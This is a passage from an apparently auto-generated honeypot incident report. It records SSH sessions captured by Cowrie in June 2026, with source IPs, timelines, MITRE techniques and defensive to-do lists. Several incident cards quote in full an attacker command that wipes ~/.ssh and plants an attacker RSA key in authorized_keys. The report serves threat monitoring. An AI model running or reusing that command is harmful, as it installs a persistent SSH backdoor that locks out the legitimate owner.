| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:36:34` | `cowrie.session.connect` |
| `2026-06-09 22:36:34` | `cowrie.client.version` |
| `2026-06-09 22:36:34` | `cowrie.client.kex` |
| `2026-06-09 22:36:35` | `cowrie.login.success` |
| `2026-06-09 22:36:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8324724b2bb4

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:37 |
| **Last Seen** | 2026-06-09 22:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:37:55` | `cowrie.session.connect` |
| `2026-06-09 22:37:55` | `cowrie.client.version` |
| `2026-06-09 22:37:55` | `cowrie.client.kex` |
| `2026-06-09 22:37:55` | `cowrie.login.success` |
| `2026-06-09 22:37:56` | `cowrie.session.params` |
| `2026-06-09 22:37:56` | `cowrie.command.input` |
| `2026-06-09 22:37:56` | `cowrie.command.failed` |
| `2026-06-09 22:37:56` | `cowrie.log.closed` |
| `2026-06-09 22:37:56` | `cowrie.session.params` |
| `2026-06-09 22:37:56` | `cowrie.command.input` |
| `2026-06-09 22:37:56` | `cowrie.session.file_download` |
| `2026-06-09 22:37:56` | `cowrie.log.closed` |
| `2026-06-09 22:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-634b373f2ad8

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:37 |
| **Last Seen** | 2026-06-09 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:37:57` | `cowrie.session.connect` |
| `2026-06-09 22:37:57` | `cowrie.client.version` |
| `2026-06-09 22:37:57` | `cowrie.client.kex` |
| `2026-06-09 22:37:57` | `cowrie.login.success` |
| `2026-06-09 22:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705e9c38f6e8

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:43 |
| **Last Seen** | 2026-06-09 22:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:43:01` | `cowrie.session.connect` |
| `2026-06-09 22:43:01` | `cowrie.client.version` |
| `2026-06-09 22:43:02` | `cowrie.client.kex` |
| `2026-06-09 22:43:03` | `cowrie.login.success` |
| `2026-06-09 22:43:03` | `cowrie.session.params` |
| `2026-06-09 22:43:03` | `cowrie.command.input` |
| `2026-06-09 22:43:03` | `cowrie.command.failed` |
| `2026-06-09 22:43:04` | `cowrie.log.closed` |
| `2026-06-09 22:43:04` | `cowrie.session.params` |
| `2026-06-09 22:43:04` | `cowrie.command.input` |
| `2026-06-09 22:43:04` | `cowrie.session.file_download` |
| `2026-06-09 22:43:04` | `cowrie.log.closed` |
| `2026-06-09 22:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45708404206b

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:43 |
| **Last Seen** | 2026-06-09 22:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:43:07` | `cowrie.session.connect` |
| `2026-06-09 22:43:07` | `cowrie.client.version` |
| `2026-06-09 22:43:07` | `cowrie.client.kex` |
| `2026-06-09 22:43:08` | `cowrie.login.success` |
| `2026-06-09 22:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788158bb64ec

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:44 |
| **Last Seen** | 2026-06-09 22:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:44:38` | `cowrie.session.connect` |
| `2026-06-09 22:44:38` | `cowrie.client.version` |
| `2026-06-09 22:44:38` | `cowrie.client.kex` |
| `2026-06-09 22:44:39` | `cowrie.login.success` |
| `2026-06-09 22:44:40` | `cowrie.session.params` |
| `2026-06-09 22:44:40` | `cowrie.command.input` |
| `2026-06-09 22:44:40` | `cowrie.command.failed` |
| `2026-06-09 22:44:40` | `cowrie.log.closed` |
| `2026-06-09 22:44:40` | `cowrie.session.params` |
| `2026-06-09 22:44:40` | `cowrie.command.input` |
| `2026-06-09 22:44:41` | `cowrie.session.file_download` |
| `2026-06-09 22:44:41` | `cowrie.log.closed` |
| `2026-06-09 22:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a807facf14

| Field | Detail |
|---|---|
| **Source IP** | `107.172.250[.]235` |
| **First Seen** | 2026-06-09 22:44 |
| **Last Seen** | 2026-06-09 22:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:44:43` | `cowrie.session.connect` |
| `2026-06-09 22:44:43` | `cowrie.client.version` |
| `2026-06-09 22:44:44` | `cowrie.client.kex` |
| `2026-06-09 22:44:44` | `cowrie.login.success` |
| `2026-06-09 22:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.172.250[.]235` to AbuseIPDB if not already reported
- [ ] Block `107.172.250[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6990c6c8ad3e

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:46 |
| **Last Seen** | 2026-06-09 22:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:46:22` | `cowrie.session.connect` |
| `2026-06-09 22:46:22` | `cowrie.client.version` |
| `2026-06-09 22:46:22` | `cowrie.client.kex` |
| `2026-06-09 22:46:23` | `cowrie.login.success` |
| `2026-06-09 22:46:23` | `cowrie.session.params` |
| `2026-06-09 22:46:23` | `cowrie.command.input` |
| `2026-06-09 22:46:23` | `cowrie.command.failed` |
| `2026-06-09 22:46:23` | `cowrie.log.closed` |
| `2026-06-09 22:46:23` | `cowrie.session.params` |
| `2026-06-09 22:46:23` | `cowrie.command.input` |
| `2026-06-09 22:46:23` | `cowrie.session.file_download` |
| `2026-06-09 22:46:23` | `cowrie.log.closed` |
| `2026-06-09 22:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c951aae732

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:46 |
| **Last Seen** | 2026-06-09 22:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:46:24` | `cowrie.session.connect` |
| `2026-06-09 22:46:24` | `cowrie.client.version` |
| `2026-06-09 22:46:24` | `cowrie.client.kex` |
| `2026-06-09 22:46:24` | `cowrie.login.success` |
| `2026-06-09 22:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8332c9994ff8

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:50 |
| **Last Seen** | 2026-06-09 22:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:50:26` | `cowrie.session.connect` |
| `2026-06-09 22:50:26` | `cowrie.client.version` |
| `2026-06-09 22:50:26` | `cowrie.client.kex` |
| `2026-06-09 22:50:26` | `cowrie.login.success` |
| `2026-06-09 22:50:26` | `cowrie.session.params` |
| `2026-06-09 22:50:26` | `cowrie.command.input` |
| `2026-06-09 22:50:26` | `cowrie.command.failed` |
| `2026-06-09 22:50:26` | `cowrie.log.closed` |
| `2026-06-09 22:50:26` | `cowrie.session.params` |
| `2026-06-09 22:50:26` | `cowrie.command.input` |
| `2026-06-09 22:50:26` | `cowrie.session.file_download` |
| `2026-06-09 22:50:26` | `cowrie.log.closed` |
| `2026-06-09 22:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-116bfe00ee51

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-09 22:50 |
| **Last Seen** | 2026-06-09 22:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:50:28` | `cowrie.session.connect` |
| `2026-06-09 22:50:28` | `cowrie.client.version` |
| `2026-06-09 22:50:28` | `cowrie.client.kex` |
| `2026-06-09 22:50:28` | `cowrie.login.success` |
| `2026-06-09 22:50:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33a306c96fa0

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-06-09 22:54 |
| **Last Seen** | 2026-06-09 22:54 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:54:19` | `cowrie.session.connect` |
| `2026-06-09 22:54:19` | `cowrie.client.version` |
| `2026-06-09 22:54:19` | `cowrie.client.kex` |
| `2026-06-09 22:54:24` | `cowrie.login.success` |
| `2026-06-09 22:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced53de271e7

| Field | Detail |
|---|---|
| **Source IP** | `116.181.19[.]113` |
| **First Seen** | 2026-06-09 22:56 |
| **Last Seen** | 2026-06-09 22:58 |
| **Session Duration** | 71s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:56:53` | `cowrie.session.connect` |
| `2026-06-09 22:57:49` | `cowrie.client.version` |
| `2026-06-09 22:57:49` | `cowrie.client.kex` |
| `2026-06-09 22:58:00` | `cowrie.login.success` |
| `2026-06-09 22:58:03` | `cowrie.session.params` |
| `2026-06-09 22:58:03` | `cowrie.command.input` |
| `2026-06-09 22:58:05` | `cowrie.log.closed` |
| `2026-06-09 22:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.181.19[.]113` to AbuseIPDB if not already reported
- [ ] Block `116.181.19[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f305c74e7815

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-06-09 22:58 |
| **Last Seen** | 2026-06-09 22:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 22:58:54` | `cowrie.session.connect` |
| `2026-06-09 22:58:54` | `cowrie.client.version` |
| `2026-06-09 22:58:55` | `cowrie.client.kex` |
| `2026-06-09 22:58:58` | `cowrie.login.success` |
| `2026-06-09 22:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-945df8589677

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-06-09 23:03 |
| **Last Seen** | 2026-06-09 23:03 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 23:03:21` | `cowrie.session.connect` |
| `2026-06-09 23:03:22` | `cowrie.client.version` |
| `2026-06-09 23:03:25` | `cowrie.client.kex` |
| `2026-06-09 23:03:28` | `cowrie.login.success` |
| `2026-06-09 23:03:30` | `cowrie.session.params` |
| `2026-06-09 23:03:30` | `cowrie.command.input` |
| `2026-06-09 23:03:30` | `cowrie.command.failed` |
| `2026-06-09 23:03:38` | `cowrie.log.closed` |
| `2026-06-09 23:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53188a17a9a

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-06-09 23:03 |
| **Last Seen** | 2026-06-09 23:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 23:03:56` | `cowrie.session.connect` |
| `2026-06-09 23:03:56` | `cowrie.client.version` |
| `2026-06-09 23:03:56` | `cowrie.client.kex` |
| `2026-06-09 23:03:59` | `cowrie.login.success` |
| `2026-06-09 23:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23f2280a585

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-06-09 23:07 |
| **Last Seen** | 2026-06-09 23:08 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 23:07:49` | `cowrie.session.connect` |
| `2026-06-09 23:07:49` | `cowrie.client.version` |
| `2026-06-09 23:07:50` | `cowrie.client.kex` |
| `2026-06-09 23:07:55` | `cowrie.login.success` |
| `2026-06-09 23:08:04` | `cowrie.session.params` |
| `2026-06-09 23:08:04` | `cowrie.command.input` |
| `2026-06-09 23:08:04` | `cowrie.command.failed` |
| `2026-06-09 23:08:05` | `cowrie.log.closed` |
| `2026-06-09 23:08:06` | `cowrie.session.params` |
| `2026-06-09 23:08:06` | `cowrie.command.input` |
| `2026-06-09 23:08:08` | `cowrie.session.file_download` |
| `2026-06-09 23:08:08` | `cowrie.log.closed` |
| `2026-06-09 23:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7284405cde84

| Field | Detail |
|---|---|
| **Source IP** | `152.200.181[.]42` |
| **First Seen** | 2026-06-09 23:08 |
| **Last Seen** | 2026-06-09 23:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 23:08:18` | `cowrie.session.connect` |
| `2026-06-09 23:08:18` | `cowrie.client.version` |
| `2026-06-09 23:08:21` | `cowrie.client.kex` |
| `2026-06-09 23:08:24` | `cowrie.login.success` |
| `2026-06-09 23:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.200.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `152.200.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.110.178[.]27` | **166** | 2026-06-09 21:50 | 2026-06-09 23:18 | 139m | 0 | `T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **91** | 2026-06-09 21:49 | 2026-06-09 23:18 | 57m | 0 | `T1592` | 🟠 MEDIUM |
| `107.172.250[.]235` | **30** | 2026-06-09 21:56 | 2026-06-09 22:54 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `144.79.133[.]50` | **29** | 2026-06-09 21:51 | 2026-06-09 22:50 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.38[.]127` | **25** | 2026-06-09 23:01 | 2026-06-09 23:06 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `131.100.242[.]102` | **15** | 2026-06-09 22:37 | 2026-06-09 23:17 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `160.30.137[.]84` | **15** | 2026-06-09 22:24 | 2026-06-09 22:26 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `185.180.141[.]47` | **5** | 2026-06-09 23:06 | 2026-06-09 23:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `152.200.181[.]42` | **4** | 2026-06-09 23:03 | 2026-06-09 23:17 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `185.180.141[.]50` | **4** | 2026-06-09 23:06 | 2026-06-09 23:06 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `185.180.141[.]48` | **2** | 2026-06-09 23:06 | 2026-06-09 23:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.105[.]167` | **2** | 2026-06-09 22:35 | 2026-06-09 22:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]198` | **2** | 2026-06-09 21:59 | 2026-06-09 21:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.181.19[.]113` | 1 | 2026-06-09 22:56 | 2026-06-09 22:57 | 58s | 0 | `T1592` | 🟢 LOW |
| `120.28.198[.]192` | 1 | 2026-06-09 22:51 | 2026-06-09 22:51 | 12s | 0 | `T1592` | 🟢 LOW |
| `220.124.230[.]188` | 1 | 2026-06-09 22:04 | 2026-06-09 22:04 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.175.91[.]53` | 1 | 2026-06-09 22:52 | 2026-06-09 22:52 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.222.246[.]27` | 1 | 2026-06-09 22:56 | 2026-06-09 22:56 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
